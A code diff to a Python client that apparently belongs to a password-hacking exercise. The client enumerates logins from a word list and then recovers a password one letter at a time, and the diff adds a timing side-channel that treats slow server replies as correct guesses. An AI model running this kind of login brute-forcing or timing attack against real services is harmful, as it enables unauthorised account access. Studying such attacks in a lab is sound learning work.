@@ -3,6 +3,7 @@ from finder import DictionnaryPassword
 from json import dumps,loads
 from string import ascii_letters
 from itertools import cycle
+from datetime import datetime
 
 class Client:
     size_buffer = 2048
@@ -31,34 +32,58 @@ class Client:
 
 
 
+def get_time(f):
+    def wrapper(self,**args):
+        start = datetime.now()
+        result = f(self,**args)
+        end = datetime.now()
+        result["time"] = (end-start).microseconds
+        return result
+    return wrapper
+
+
 def payload(**args):
+
     return dumps(args)
+
 
 class ClientLogin(Client):
     def __init__(self,address):
         super().__init__(address)
 
+    @get_time
+    def send(self,**data):
+        self.client.send(payload(**data).encode())
+        return loads(self.client.recv(self.size_buffer).decode())
+
+
     def search(self):
         logins = DictionnaryPassword("./hacking/logins.txt")
         login_find = ""
         for login in logins.find_password():
-            self.client.send(payload(login=login,password=" ").encode())
-            response = loads(self.client.recv(self.size_buffer).decode())
-
+            response = self.send(login=login,password=" ")
             if  response["result"] == "Wrong password!":
                 login_find=login
                 break
 
 
         password=""
+        time_response = []
+        for letter in ascii_letters:
+           response = self.send(login=login_find,password=letter)
+           time_response.append(response["time"])
+
+        average_time= sum(time_response)/len(time_response)
+
 
         for letter in cycle(ascii_letters+"0123456789"):
 
             test_password = password  + letter
 
-            self.client.send(payload(login=login_find,password=test_password).encode())
-            response=loads(self.client.recv(self.size_buffer).decode())
+            response=self.send(login=login_find,password=test_password)
 
+            if response["time"] > average_time:
+                password+=letter
             if response["result"]=="Exception happened during login":
                 password+=letter
             elif response["result"]=="Connection success!":
